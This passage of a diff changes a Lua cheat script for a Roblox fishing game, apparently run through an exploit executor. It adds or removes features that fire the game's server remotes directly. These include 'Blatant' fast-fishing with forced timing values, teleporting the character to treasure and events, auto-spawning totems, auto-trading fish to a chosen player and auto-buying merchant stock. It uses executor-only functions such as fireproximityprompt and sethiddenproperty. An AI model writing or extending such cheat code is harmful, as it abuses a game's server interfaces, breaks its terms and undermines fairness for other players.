+        elseif totem.Id == 2 then
+            GameData.TotemCount.Mutation += 1
+        elseif totem.Id == 3 then
+            GameData.TotemCount.Shiny += 1
+        end
+    end
 
----------------------------------------------------------
--- SELECT TOTEM DROPDOWN (FIXED)
----------------------------------------------------------
+    GameData.TotemParagraph:UpdateBody(
+        "Luck Totem: " .. GameData.TotemCount.Luck .. "\n" ..
+        "Mutation Totem: " .. GameData.TotemCount.Mutation .. "\n" ..
+        "Shiny Totem: " .. GameData.TotemCount.Shiny
+    )
+end
+
+sections.Fishing3:Button({
+    Name = "Refresh Info",
+    Callback = function()
+        GameData.UpdateTotemCount()
+
+        Window:Notify({
+            Title = "Totem Info",
+            Description = "Totem count refreshed"
+        })
+    end,
+})
+
+sections.Fishing3:Divider()
+
+GameData.Client =
+    require(GameData.ReplicatedStorage.Packages.Replion).Client
+
+GameData.Data =
+    GameData.Client:WaitReplion("Data")
+
+GameData.SpawnTotemRE =
+    GameData.ReplicatedStorage
+        :WaitForChild("Packages")
+        :WaitForChild("_Index")
+        :WaitForChild("sleitnick_net@0.2.0")
+        :WaitForChild("net")
+        :WaitForChild("RE/SpawnTotem")
+
 sections.Fishing3:Dropdown({
-    Name = "Select Totem",
+    Name = "Select Totems",
     Search = true,
-    Multi = false, -- Multi = false -> Value = STRING
-    Required = false,
-    Options = {"Luck Totem", "Mutation Totem", "Shiny Totem"},
-    Default = {"Luck Totem"},
-    Callback = function(Value)
-        GameData.selectedTotem = Value  -- langsung ambil string
-        print("Selected Totem:", GameData.selectedTotem)
+    Multi = false,
+    Required = true,
+    Options = {
+        "Luck Totem",
+        "Mutation Totem",
+        "Shiny Totem"
+    },
+    Default = "Luck Totem",
+    Callback = function(value)
+        GameData.SelectedTotemId = GameData.TotemMap[value]
     end,
 }, "SelectTotemDropdown")
 
-
----------------------------------------------------------
--- AUTO SPAWN TOGGLE
----------------------------------------------------------
 sections.Fishing3:Toggle({
     Name = "Auto Spawn Totem",
     Default = false,
     Callback = function(value)
-        GameData.autoSpawn = value
+        GameData.SpawnToggle = value
 
         Window:Notify({
-            Title = "Spawn Totem",
-            Description = (value and "Enabled " or "Disabled ") .. "Auto Spawn Totem"
+            Title = "Totem",
+            Description = value
+                and "Enabled Auto Spawn Totem"
+                or "Disabled Auto Spawn Totem"
         })
 
-        if value then
-            task.spawn(function()
-                while GameData.autoSpawn do
-                    
-                    if GameData.selectedTotem then
-                        
-                        GameData.id = GameData.TOTEM_IDS[GameData.selectedTotem]
-                        GameData.uuid = nil
+        if not value or not GameData.SelectedTotemId then
+            return
+        end
 
-                        -- Cari totem di inventory
-                        for _, totem in ipairs(GameData.inventory.Totems or {}) do
-                            GameData.itemData = GameData.ItemUtility.GetItemDataFromItemType("Totems", totem.Id)
+        task.spawn(function()
+            while GameData.SpawnToggle do
+                local inventory = GameData.Data:GetExpect("Inventory")
 
-                            if GameData.itemData and GameData.itemData.Data.Id == GameData.id then
-                                GameData.uuid = totem.UUID
-                                break
-                            end
-                        end
-
-                        -- Spawn kalau ada
-                        if GameData.uuid then
-                            print("Spawning:", GameData.selectedTotem, "UUID:", GameData.uuid)
-                            GameData.SpawnTotem:FireServer(GameData.uuid)
-                        else
-                            warn("Totem not found:", GameData.selectedTotem)
+                if inventory and inventory.Totems then
+                    for _, totem in ipairs(inventory.Totems) do
+                        if not GameData.SpawnToggle then break end
+                        if totem.Id == GameData.SelectedTotemId and totem.UUID then
+                            GameData.SpawnTotemRE:FireServer(totem.UUID)
+                            task.wait(1)
                         end
                     end
-
-                    task.wait(5)
                 end
-            end)
-        end
+
+                task.wait(5)
+            end
+        end)
     end,
 }, "AutoSpawnTotemToggle")
-
-sections.Fishing4:Header({
-	Name = "Blatant V1"
-})
-
--- SETUP LOCALPLAYER
-GameData.LP = GameData.Players.LocalPlayer
-
--- GET NET FOLDER
-GameData.net = GameData.RS.Packages._Index["sleitnick_net@0.2.0"]:WaitForChild("net")
-
--- REMOTES
-GameData.RF_Charge = GameData.net:WaitForChild("RF/ChargeFishingRod")
-GameData.RF_Start  = GameData.net:WaitForChild("RF/RequestFishingMinigameStarted")
-GameData.RF_Cancel = GameData.net:WaitForChild("RF/CancelFishingInputs")
-GameData.RE_Finish = GameData.net:WaitForChild("RE/FishingCompleted")
-GameData.RE_Equip  = GameData.net:WaitForChild("RE/EquipToolFromHotbar")
-
--- EQUIP TOOL FUNCTION
-GameData.EquipTool = function()
-    pcall(function() GameData.RE_Equip:FireServer(1) end)
-end
-
--- FAST FISH FUNCTION
-GameData.FastFish = function()
-    task.spawn(function()
-        GameData.RF_Cancel:InvokeServer()
-        task.wait(GameData.CancelDelay)
-
-        GameData.RF_Charge:InvokeServer(workspace:GetServerTimeNow())
-        GameData.RF_Start:InvokeServer(-1, 0.9964)
-
-        task.wait(GameData.CompleteDelay)
-        GameData.RE_Finish:FireServer()
-    end)
-end
-
--- START LOOP FUNCTION
-GameData.StartLoop = function()
-    if GameData.enabled then return end
-    GameData.enabled = true
-
-    GameData.EquipTool()
-
-    task.spawn(function()
-        while GameData.enabled do
-            local tickNow = tick()
-            GameData.FastFish()
-
-            while GameData.enabled and tick() - tickNow < (_G.ReelSuper or 1.05) do
-                task.wait()
-            end
-        end
-    end)
-end
-
--- STOP LOOP FUNCTION
-GameData.StopLoop = function()
-    GameData.enabled = false
-end
-
--- UI KUZU HUB
-sections.Fishing4:Toggle({
-    Name = "Blatant V1",
-    Default = false,
-    Callback = function(state)
-        if state then
-            GameData.StartLoop()
-            Window:Notify({ Title = "Blatant V1", Description = "Enabled Fishing" })
-        else
-            GameData.StopLoop()
-            Window:Notify({ Title = "Blatant V1", Description = "Disabled Fishing" })
-        end
-    end,
-}, "FishingToggle")
-
-sections.Fishing4:Input({
-    Name = "Cancel Delay V1",
-    Placeholder = "1.05",
-    AcceptedCharacters = "0123456789.",
-    Callback = function(txt)
-        local n = tonumber(txt)
-        if n and n > 0 then
-            GameData.CancelDelay = n
-            Window:Notify({ Title = "Blatant V1", Description = "Cancel Delay Set: "..tostring(n) })
-        else
-            Window:Notify({ Title = "Blatant V1", Description = "Invalid Cancel Delay!" })
-        end
-    end,
-}, "CancelDelayInput")
-
-sections.Fishing4:Input({
-    Name = "Complete Delay V1",
-    Placeholder = "0.16",
-    AcceptedCharacters = "0123456789.",
-    Callback = function(txt)
-        local n = tonumber(txt)
-        if n and n > 0 then
-            GameData.CompleteDelay = n
-            Window:Notify({ Title = "Blatant V1", Description = "Complete Delay Set: "..tostring(n) })
-        else
-            Window:Notify({ Title = "Blatant V1", Description = "Invalid Complete Delay!" })
-        end
-    end,
-}, "CompleteDelayInput")
 
 sections.Fishing5:Header({
 	Name = "Blatant V2"
@@ -2186,8 +2023,8 @@ GameData.EnableSkip()
 
 -- GLOBAL CONFIG
 _G.BlatantV2 = false
-_G.DelayLoopStartV2 = 0.80
-_G.DelayCompleteV2 = 1
+_G.DelayLoopStartV2 = 1.9
+_G.DelayCompleteV2 = 0.8
 
 -- FASTEST FUNCTION
 GameData.Fastest = function()
@@ -2214,7 +2051,7 @@ end
 
 -- WINDUI
 sections.Fishing5:Toggle({
-    Name = "Blatant V2",
+    Name = "Blatant",
     Default = _G.BlatantV2,
     Callback = function(value)
         _G.BlatantV2 = value
@@ -2230,8 +2067,8 @@ sections.Fishing5:Toggle({
 }, "BlatantV2Toggle")
 
 sections.Fishing5:Input({
-    Name = "Delay Cast V2",
-    Placeholder = "0.80",
+    Name = "Delay Cast",
+    Placeholder = "1.9",
     AcceptedCharacters = "Numbers",
     Callback = function(input)
         local num = tonumber(input)
@@ -2242,8 +2079,8 @@ sections.Fishing5:Input({
 }, "DelayCastV2Input")
 
 sections.Fishing5:Input({
-    Name = "Delay Complete V2",
-    Placeholder = "1",
+    Name = "Delay Complete",
+    Placeholder = "0.8",
     AcceptedCharacters = "Numbers",
     Callback = function(input)
         local num = tonumber(input)
@@ -2748,251 +2585,9 @@ sections.Fishing8:Toggle({
 }, "AutoSellToggle")
 
 sections.Event:Header({
-	Name = "Event Hunt"
+	Name = "Event Hunt (Fix Bug)"
 })
 
--- Setup player
-GameData.Player = GameData.Players.LocalPlayer
-GameData.Character = GameData.Player.Character or GameData.Player.CharacterAdded:Wait()
-GameData.HRP = GameData.Character:WaitForChild("HumanoidRootPart")
-
--- ===========================================================
--- 🔥 FUNGSI: Ambil semua Sunken Wreckage
--- ===========================================================
-GameData.GetAllSunkenModels = function()
-    GameData.TempList = {}
-
-    for _, v in pairs(workspace:GetChildren()) do
-        if v.Name == "Sunken Wreckage" and v:IsA("Model") then
-            table.insert(GameData.TempList, v)
-        end
-    end
-
-    return GameData.TempList
-end
-
--- ===========================================================
--- 🔥 FUNGSI: Proses 1 Wreckage
--- ===========================================================
-GameData.ProcessOneWreckage = function(Wreck)
-    if not Wreck then return end
-
-    GameData.TempTreasure = Wreck:FindFirstChild("Treasure")
-    if not GameData.TempTreasure then return end
-
-    GameData.TempShine = GameData.TempTreasure:FindFirstChild("Shine")
-    if not GameData.TempShine then return end
-
-    GameData.TempPrompt = GameData.TempShine:FindFirstChild("ProximityPrompt")
-    if not GameData.TempPrompt then return end
-
-    -- Teleport
-    GameData.HRP.CFrame = GameData.TempTreasure.CFrame + Vector3.new(0, 3, 0)
-
-    repeat task.wait() until GameData.TempPrompt.Enabled and GameData.TempPrompt.Parent ~= nil
-
-    task.wait(0.15)
-    fireproximityprompt(GameData.TempPrompt)
-end
-
--- ===========================================================
--- 🔥 LOOP OTOMATIS
--- ===========================================================
-GameData.AutoTreasureLoop = function()
-    while GameData.AutoTreasure do
-
-        GameData.TempList = GameData.GetAllSunkenModels()
-
-        for _, wreck in ipairs(GameData.TempList) do
-
-            if not GameData.AutoTreasure then break end
-
-            GameData.ProcessOneWreckage(wreck)
-
-            task.wait(0.5)
-            while wreck:FindFirstChild("Treasure") do
-                if not GameData.AutoTreasure then break end
-                task.wait(0.2)
-            end
-        end
-
-        task.wait(1)
-    end
-end
-
--- ===========================================================
--- 🔘 TOGGLE UI
--- ===========================================================
-sections.Event:Toggle({
-    Name = "Auto Treasure Hunt",
-    Default = false,
-
-    Callback = function(state)
-        GameData.AutoTreasure = state
-
-        Window:Notify({
-            Title = "Treasure Hunt",
-            Description = (state and "Enabled" or "Disabled") .. " Auto Treasure Hunt"
-        })
-
-        if state then
-            GameData.AutoTreasureThread = task.spawn(GameData.AutoTreasureLoop)
-        end
-    end,
-}, "AutoTreasureHuntToggle")
-
-
--- Character
-GameData.char = GameData.player.Character or GameData.player.CharacterAdded:Wait()
-GameData.hrp = GameData.char:WaitForChild("HumanoidRootPart")
-
--- Folder
-GameData.exclaimFolder = workspace:WaitForChild("!!! MENU RINGS")
-
-
----------------------------------------------------------
---⭕ DROPDOWN BARU: Select Auto Events
----------------------------------------------------------
-sections.Event:Dropdown({
-	Name = "Select Auto Events",
-	Search = true,
-	Multi = true,
-	Required = false,
-	Options = GameData.eventsList,
-	Default = {},
-	Callback = function(Value)
-		local result = {}
-
-		for eventName, state in next, Value do
-			if state then table.insert(result, eventName) end
-		end
-
-		GameData.SelectedAutoEvents = result
-	end
-}, "SelectAutoEventsNew")
-
-
----------------------------------------------------------
---⭕ DROPDOWN BARU: Auto Event Priority
----------------------------------------------------------
-sections.Event:Dropdown({
-	Name = "Priority Events",
-	Search = true,
-	Multi = true,
-	Required = false,
-	Options = GameData.eventsList,
-	Default = {},
-	Callback = function(Value)
-		local result = {}
-
-		for eventName, state in next, Value do
-			if state then table.insert(result, eventName) end
-		end
-
-		GameData.AutoEventPriority = result
-	end
-}, "PriorityEventsNew")
-
-
----------------------------------------------------------
---⭕ TOGGLE BARU: Auto Join Event
----------------------------------------------------------
-sections.Event:Toggle({
-	Name = "Auto Join Event",
-	Default = false,
-	Callback = function(v)
-
-		if v and not GameData.savedCFrame then
-			if GameData.hrp then
-				GameData.savedCFrame = GameData.hrp.CFrame
-			else
-				Window:Notify({
-					Title = "Error",
-					Description = "Character not loaded!",
-				})
-				return false
-			end
-		end
-
-		GameData.AutoEventToggle = v
-
-		if not v and GameData.savedCFrame then
-			task.wait(0.1)
-			if GameData.hrp then
-				GameData.hrp.CFrame = GameData.savedCFrame + Vector3.new(0, 5, 0)
-			end
-		end
-	end
-}, "ToggleAutoEventNew")
-
-
----------------------------------------------------------
---⭕ AUTO EVENT LOOP
----------------------------------------------------------
-task.spawn(function()
-
-    while task.wait(1) do
-        if GameData.AutoEventToggle and GameData.hrp then
-            
-            local searchOrder = {}
-
-            for _, v in ipairs(GameData.AutoEventPriority) do
-                table.insert(searchOrder, v)
-            end
-
-            for _, v in ipairs(GameData.SelectedAutoEvents) do
-                if not table.find(searchOrder, v) then
-                    table.insert(searchOrder, v)
-                end
-            end
-
-            local targetFound = nil
-
-            for _, eventName in ipairs(searchOrder) do
-                for _, prop in pairs(GameData.exclaimFolder:GetChildren()) do
-                    for _, d in pairs(prop:GetDescendants()) do
-                        if d.Name == eventName then
-                            targetFound = d
-                            break
-                        end
-                    end
-                    if targetFound then break end
-                end
-                if targetFound then break end
-            end
-
-            if targetFound and targetFound:IsA("BasePart") then
-                local pos = targetFound.CFrame.Position
-
-                if not GameData.platform or not GameData.platform.Parent then
-                    GameData.platform = Instance.new("Part")
-                    GameData.platform.Anchored = true
-                    GameData.platform.CanCollide = true
-                    GameData.platform.Transparency = 1
-                    GameData.platform.Size = Vector3.new(10, 1, 10)
-                    GameData.platform.Parent = workspace
-                end
-
-                GameData.platform.Position = pos + Vector3.new(0,5,0)
-                GameData.hrp.CFrame = CFrame.new(GameData.platform.Position + Vector3.new(0, 3, 0))
-
-                GameData.atEvent = true
-            else
-                if GameData.atEvent and GameData.savedCFrame then
-                    GameData.hrp.CFrame = GameData.savedCFrame + Vector3.new(0,5,0)
-                    GameData.atEvent = false
-                    if GameData.platform then GameData.platform:Destroy() GameData.platform = nil end
-                end
-            end
-        end
-    end
-end)
-
-
-GameData.player.CharacterAdded:Connect(function()
-    task.wait(0.2)
-    GameData.hrp = GameData.player.Character:WaitForChild("HumanoidRootPart")
-end)
 
 sections.Quest:Header({
 	Name = "View Quest Status"
@@ -3915,6 +3510,287 @@ function doEnchantCycle()
     return false
 end
 
+sections.Auto2:Header({
+	Name = "Auto Trade"
+})
+
+
+--// SERVICES
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+
+
+GameData.DataReplion = GameData.ReplionClient:WaitReplion("Data")
+GameData.TierList = GameData.TierList001
+
+for num, name in pairs(GameData.TierMap001) do
+	GameData.nameToTier[name] = num
+end
+
+---------------------------------------------------------
+-- FUNCTIONS
+---------------------------------------------------------
+
+function GameData.normalize(value)
+	if not value then return {} end
+	if type(value) == "string" then
+		return { value }
+	end
+
+	local out = {}
+	for k, v in pairs(value) do
+		if type(k) == "string" and v == true then
+			table.insert(out, k)
+		elseif type(v) == "string" then
+			table.insert(out, v)
+		end
+	end
+	return out
+end
+
+function GameData.isTierMatch(itemTier, selected)
+	for _, tName in ipairs(selected) do
+		if GameData.nameToTier[tName] == tonumber(itemTier) then
+			return true
+		end
+	end
+	return false
+end
+
+function GameData.safeTrade(userid, uuid)
+	pcall(function()
+		GameData.TradeRemote:InvokeServer(userid, uuid)
+	end)
+end
+
+---------------------------------------------------------
+-- AUTO TRADE WORKER
+---------------------------------------------------------
+
+function GameData.workerTrade()
+	GameData.RATE = 0.15
+	GameData.LOOP_DELAY = 1
+
+	while GameData.state.Auto2Trade do
+		if GameData.state.stopTrade then
+			return
+		end
+
+		local target = Players:FindFirstChild(GameData.state.targetPlayer)
+		if not target then
+			GameData.state.Auto2Trade = false
+			return
+		end
+
+		local inventory = GameData.DataReplion:GetExpect({ "Inventory", "Items" }) or {}
+		local list = {}
+
+		for _, item in ipairs(inventory) do
+			local ok, data = pcall(function()
+				return GameData.ItemUtility.GetItemDataFromItemType("Items", item.Id)
+			end)
+
+			if ok and data and data.Data then
+				if data.Data.Type == "Fish"
+					and GameData.isTierMatch(
+						data.Data.Tier,
+						GameData.state.selectedTiers
+					) then
+					table.insert(list, item.UUID)
+				end
+			end
+		end
+
+		if #list == 0 then
+			Window:Notify({
+				Title = "Trade",
+				Description = "No more fish for selected tier"
+			})
+			GameData.state.Auto2Trade = false
+			break
+		end
+
+		for _, uuid in ipairs(list) do
+			if not GameData.state.Auto2Trade then
+				break
+			end
+
+			GameData.safeTrade(target.UserId, uuid)
+			task.wait(GameData.RATE)
+		end
+
+		task.wait(GameData.LOOP_DELAY)
+	end
+end
+
+---------------------------------------------------------
+-- NOTIFICATION LISTENER
+---------------------------------------------------------
+
+GameData.notifGui = GameData.player.PlayerGui:WaitForChild("Text Notifications")
+GameData.notifFrame = GameData.notifGui:WaitForChild("Frame")
+
+function GameData.checkTradeTile(tile)
+	local header = tile:FindFirstChild("Header")
+	if header and header:IsA("TextLabel") then
+		if header.Text == "Trade completed!" then
+
+			GameData.state.fishCount =
+				GameData.state.fishCount + 1
+
+			Window:Notify({
+				Title = "Trade",
+				Description =
+					"Trade completed! ("
+					.. GameData.state.fishCount
+					.. "/"
+					.. GameData.state.fishTarget
+					.. ")"
+			})
+
+			if GameData.state.fishTarget > 0
+				and GameData.state.fishCount >= GameData.state.fishTarget then
+
+				GameData.state.Auto2Trade = false
+				GameData.state.stopTrade = true
+
+				Window:Notify({
+					Title = "Trade",
+					Description = "Trade target reached!"
+				})
+			end
+		end
+	end
+end
+
+for _, tile in ipairs(GameData.notifFrame:GetChildren()) do
+	if tile.Name == "TextTile" then
+		GameData.checkTradeTile(tile)
+	end
+end
+
+GameData.notifFrame.ChildAdded:Connect(function(child)
+	if child.Name == "TextTile" then
+		local headerObj = child:WaitForChild("Header", 5)
+		if headerObj then
+			GameData.checkTradeTile(child)
+		end
+	end
+end)
+
+---------------------------------------------------------
+-- UI
+---------------------------------------------------------
+
+-- MAP LABEL → USERNAME
+local PlayerMap = {}
+
+-- PLAYER DROPDOWN
+local PlayerDropdown = sections.Auto2:Dropdown({
+	Name = "Select Target Player",
+	Search = true,
+	Multi = false,
+	Required = false,
+	Options = {},
+	Default = {},
+	Callback = function(label)
+		if PlayerMap[label] then
+			GameData.state.targetPlayer = PlayerMap[label]
+			Window:Notify({
+				Title = "Target",
+				Description = "Selected: " .. label
+			})
+		end
+	end,
+}, "PlayerDropdown")
+
+-- REFRESH PLAYER LIST
+local function RefreshPlayers()
+	local Options = {}
+	table.clear(PlayerMap)
+
+	for _, plr in ipairs(Players:GetPlayers()) do
+		if plr ~= Players.LocalPlayer then
+			local label = plr.DisplayName .. " @" .. plr.Name
+			PlayerMap[label] = plr.Name
+			table.insert(Options, label)
+		end
+	end
+
+	PlayerDropdown:ClearOptions()
+	PlayerDropdown:InsertOptions(Options)
+
+	if #Options > 0 then
+		PlayerDropdown:UpdateSelection(Options[1])
+		GameData.state.targetPlayer = PlayerMap[Options[1]]
+	end
+end
+
+RefreshPlayers()
+
+sections.Auto2:Button({
+	Name = "Refresh Player List",
+	Callback = function()
+		RefreshPlayers()
+	end,
+})
+
+-- TARGET AMOUNT
+sections.Auto2:Input({
+	Name = "Fish Amount Trade",
+	Placeholder = "Example: 10",
+	AcceptedCharacters = "0123456789",
+	Callback = function(input)
+		local amount = tonumber(input)
+		if amount then
+			GameData.state.fishTarget = amount
+			GameData.state.fishCount = 0
+			Window:Notify({
+				Title = "Trade",
+				Description = "Trade target set: " .. amount
+			})
+		else
+			Window:Notify({
+				Title = "Error",
+				Description = "Input must be a number!"
+			})
+		end
+	end,
+}, "TargetAmountInput")
+
+-- TIER DROPDOWN
+sections.Auto2:Dropdown({
+	Name = "Select Tier(s)",
+	Search = true,
+	Multi = true,
+	Options = GameData.TierList001,
+	Default = { "Rare" },
+	Callback = function(val)
+		GameData.state.selectedTiers = GameData.normalize(val)
+		Window:Notify({
+			Title = "Tier Selected",
+			Description = table.concat(
+				GameData.state.selectedTiers,
+				", "
+			)
+		})
+	end
+}, "TierDropdown")
+
+-- AUTO TRADE TOGGLE
+sections.Auto2:Toggle({
+	Name = "Auto Trade",
+	Default = false,
+	Callback = function(b)
+		GameData.state.Auto2Trade = b
+		GameData.state.stopTrade = not b
+
+		if b then
+			task.spawn(GameData.workerTrade)
+		end
+	end
+}, "AutoTradeToggle")
+
 sections.Shop:Header({
 	Name = "Rod Shop"
 })
@@ -4099,24 +3975,46 @@ sections.Shop2:Header({
 	Name = "Skin"
 })
 
+-- Require GiftingController
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local GiftingController = require(
     ReplicatedStorage
         :WaitForChild("Controllers")
         :WaitForChild("GiftingController")
 )
 
+-- Penyimpan item gift yang dipilih
+local SelectedGiftSkin = "Princess Parasol"
+
+-- Dropdown (menggunakan string)
+sections.Shop2:Dropdown({
+    Name = "Gift Skin Rod",
+    Search = true,
+    Multi = false,
+    Required = false,
+    Options = {"Princess Parasol", "Eclipse Katana", "Soul Scythe"},
+    Default = {"Princess Parasol"},
+    Callback = function(Value)
+        -- Karena Multi = false → Value sudah berupa STRING
+        SelectedGiftSkin = tostring(Value)
+    end,
+}, "GiftSkinRodDropdown")
+
+
+-- Button Gift
 sections.Shop2:Button({
-    Name = "Gift Skin (Princess Parasol)",
+    Name = "Gift Selected Skin",
     Callback = function()
-        GiftingController:Open("Princess Parasol")
+        GiftingController:Open(SelectedGiftSkin)
 
         Window:Notify({
             Title = "Gift Menu",
-            Description = "Gift Princess Parasol unlocked!",
+            Description = "Gift " .. SelectedGiftSkin .. " unlocked!",
             Lifetime = 3
         })
     end,
 })
+
 
 sections.Shop3:Header({
 	Name = "Weather Shop"
@@ -4262,7 +4160,164 @@ sections.Shop4:Toggle({
     end,
 }, "AutoBuyBoatToggle")
 
+sections.Shop5:Header({
+	Name = "Traveling Merchant"
+})
 
+GameData.Replion = require(GameData.ReplicatedStorage.Packages.Replion)
+GameData.MarketItemData = require(GameData.ReplicatedStorage.Shared.MarketItemData)
+GameData.ItemUtility = require(GameData.ReplicatedStorage.Shared.ItemUtility)
+
+GameData.Merchant = GameData.Replion.Client:WaitReplion("Merchant")
+
+GameData.PurchaseRF =
+    GameData.ReplicatedStorage
+        :WaitForChild("Packages")
+        :WaitForChild("_Index")
+        :WaitForChild("sleitnick_net@0.2.0")
+        :WaitForChild("net")
+        :WaitForChild("RF/PurchaseMarketItem")
+
+function GameData.getMerchantItems()
+    return GameData.Merchant:GetExpect("Items") or {}
+end
+
+function GameData.getMarketDataFromId(id)
+    for _, v in ipairs(GameData.MarketItemData) do
+        if v.Id == id then
+            return v
+        end
+    end
+end
+
+function GameData.buildMerchantText()
+    local items = GameData.getMerchantItems()
+    if #items == 0 then
+        return "No stock available"
+    end
+
+    local lines = {}
+
+    for _, marketId in ipairs(items) do
+        local marketData = GameData.getMarketDataFromId(marketId)
+        if marketData then
+            local itemData = GameData.ItemUtility.GetItemDataFromItemType(
+                marketData.Type,
+                marketData.Identifier
+            )
+
+            local name = itemData and itemData.Data.Name or "Unknown Item"
+
+            table.insert(lines,
+                string.format(
+                    "• %s\n  └ MarketID: %d | Type: %s",
+                    name,
+                    marketId,
+                    tostring(marketData.Type)
+                )
+            )
+        end
+    end
+
+    return table.concat(lines, "\n")
+end
+
+function GameData.updateParagraph()
+    local items = GameData.getMerchantItems()
+
+    GameData.MerchantParagraph:UpdateHeader(
+        ("Info Stock Merchant (%d)"):format(#items)
+    )
+    GameData.MerchantParagraph:UpdateBody(GameData.buildMerchantText())
+
+    if GameData.MerchantParagraph.SetVisible then
+        GameData.MerchantParagraph:SetVisible(true)
+    end
+end
+
+function GameData.getDropdownOptions()
+    local options = {}
+    for _, marketId in ipairs(GameData.getMerchantItems()) do
+        table.insert(options, "MarketID: " .. marketId)
+    end
+    return options
+end
+
+function GameData.refreshMerchantUI()
+    GameData.updateParagraph()
+
+    if GameData.MerchantDropdown then
+        GameData.MerchantDropdown:ClearOptions()
+        GameData.MerchantDropdown:InsertOptions(GameData.getDropdownOptions())
+        GameData.MerchantDropdown:UpdateSelection({})
+    end
+
+    table.clear(GameData.SelectedMarketIDs)
+end
+
+GameData.MerchantParagraph = sections.Shop5:Paragraph({
+    Header = "Info Stock Merchant",
+    Body = "Loading merchant stock..."
+})
+
+GameData.MerchantDropdown = sections.Shop5:Dropdown({
+    Name = "Select Merchant",
+    Search = true,
+    Multi = true,
+    Required = false,
+    Options = {},
+    Default = {},
+    Callback = function(Value)
+        table.clear(GameData.SelectedMarketIDs)
+
+        for label, state in pairs(Value or {}) do
+            if state then
+                local id = tonumber(label:match("%d+"))
+                if id then
+                    table.insert(GameData.SelectedMarketIDs, id)
+                end
+            end
+        end
+    end,
+}, "MerchantDropdown")
+
+sections.Shop5:Toggle({
+    Name = "Auto Purchase",
+    Default = false,
+    Callback = function(value)
+        GameData.AutoPurchase = value
+
+        Window:Notify({
+            Title = "Merchant",
+            Description = value and "Auto Purchase Enabled" or "Auto Purchase Disabled"
+        })
+    end,
+}, "AutoPurchaseToggle")
+
+sections.Shop5:Button({
+    Name = "Refresh Stock",
+    Callback = function()
+        GameData.refreshMerchantUI()
+    end
+})
+
+task.spawn(function()
+    while task.wait(1) do
+        if GameData.AutoPurchase and #GameData.SelectedMarketIDs > 0 then
+            for _, marketId in ipairs(GameData.SelectedMarketIDs) do
+                pcall(function()
+                    GameData.PurchaseRF:InvokeServer(marketId)
+                end)
+                task.wait(0.3)
+            end
+        end
+    end
+end)
+
+GameData.refreshMerchantUI()
+GameData.Merchant:OnChange("Items", function()
+    GameData.refreshMerchantUI()
+end)
 
 sections.Boat:Header({
 	Name = "Boat Spawn"
@@ -5108,101 +5163,114 @@ sections.Player:Toggle({
     end,
 }, "WalkOnWaterToggle")
 
-sections.Player:Button({
-    Name = "Boost FPS",
-    Callback = function()
-        local Lighting = game:GetService("Lighting")
-        local Workspace = game:GetService("Workspace")
-        local Terrain = Workspace:FindFirstChildOfClass("Terrain")
 
-        -- Lighting Optimization
-        Lighting.GlobalShadows = false
-        Lighting.FogEnd = 1e10
-        Lighting.BFullness = 1
-        Lighting.ExposureCompensation = 0
-        Lighting.EnvironmentDiffuseScale = 0
-        Lighting.EnvironmentSpecularScale = 0
-        Lighting.OutdoorAmbient = Color3.fromRGB(128,128,128)
-        Lighting.ShadowSoftness = 0
-        Lighting.ColorShift_Bottom = Color3.new(0,0,0)
-        Lighting.ColorShift_Top = Color3.new(0,0,0)
+GameData.Terrain = GameData.Workspace:FindFirstChildOfClass("Terrain")
 
-        -- Terrain Optimization
-        if Terrain then
-            Terrain.WaterWaveSize = 0
-            Terrain.WaterWaveSpeed = 0
-            Terrain.WaterReflectance = 0
-            Terrain.WaterTransparency = 1
-            sethiddenproperty(Terrain, "Decoration", false)
+function GameData.ApplyMinecraftFPS()
+    GameData.Lighting.GlobalShadows = false
+    GameData.Lighting.FogEnd = 1e10
+    GameData.Lighting.Brightness = 1
+    GameData.Lighting.ExposureCompensation = 0
+    GameData.Lighting.EnvironmentDiffuseScale = 0
+    GameData.Lighting.EnvironmentSpecularScale = 0
+    GameData.Lighting.ShadowSoftness = 0
+    GameData.Lighting.OutdoorAmbient = Color3.fromRGB(140,140,140)
+
+    for _, v in pairs(GameData.Lighting:GetChildren()) do
+        if v:IsA("PostEffect") then
+            v.Enabled = false
         end
+    end
 
-        -- Disable Visual Effects (Bloom, Blur, SunRays, dll)
-        for _, v in pairs(Lighting:GetChildren()) do
-            if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("DepthOfFieldEffect") then
-                v.Enabled = false
-            end
-        end
-
-        -- Mass Disable Visuals (tanpa hapus animasi/suara)
+    if GameData.Terrain then
+        GameData.Terrain.WaterWaveSize = 0
+        GameData.Terrain.WaterWaveSpeed = 0
+        GameData.Terrain.WaterReflectance = 0
+        GameData.Terrain.WaterTransparency = 1
         pcall(function()
-            for _, obj in pairs(Workspace:GetDescendants()) do
-                if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") or obj:IsA("Explosion") then
-                    obj.Enabled = false
-                elseif obj:IsA("Decal") or obj:IsA("Texture") then
-                    obj.Transparency = 1
-                elseif obj:IsA("MeshPart") or obj:IsA("UnionOperation") or obj:IsA("Part") then
-                    obj.Material = Enum.Material.SmoothPlastic
-                    obj.Reflectance = 0
-                end
-            end
+            sethiddenproperty(GameData.Terrain, "Decoration", false)
         end)
+    end
 
-        -- Rendering Quality to Lowest
-        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
+    for _, obj in pairs(GameData.Workspace:GetDescendants()) do
+        if not GameData.MinecraftFPS then break end
 
-        -- Optimize Camera
-        for _, cam in pairs(Workspace:GetDescendants()) do
-            if cam:IsA("Camera") then
-                cam.FieldOfView = 70
-            end
+        if obj:IsA("ParticleEmitter")
+        or obj:IsA("Trail")
+        or obj:IsA("Smoke")
+        or obj:IsA("Fire")
+        or obj:IsA("Sparkles")
+        or obj:IsA("Beam")
+        or obj:IsA("Explosion") then
+            obj.Enabled = false
+
+        elseif obj:IsA("Decal") or obj:IsA("Texture") then
+            obj.Transparency = 1
+
+        elseif obj:IsA("SurfaceAppearance") then
+            obj:Destroy()
+
+        elseif obj:IsA("MeshPart") then
+            obj.Material = Enum.Material.SmoothPlastic
+            obj.Color = Color3.fromRGB(150,150,150)
+            obj.Reflectance = 0
+            obj.CastShadow = false
+            obj.LOD = Enum.MeshPartDetailLevel.Low
+
+        elseif obj:IsA("UnionOperation") or obj:IsA("Part") then
+            obj.Material = Enum.Material.SmoothPlastic
+            obj.Color = Color3.fromRGB(150,150,150)
+            obj.Reflectance = 0
+            obj.CastShadow = false
         end
+    end
 
-        -- Garbage Clean
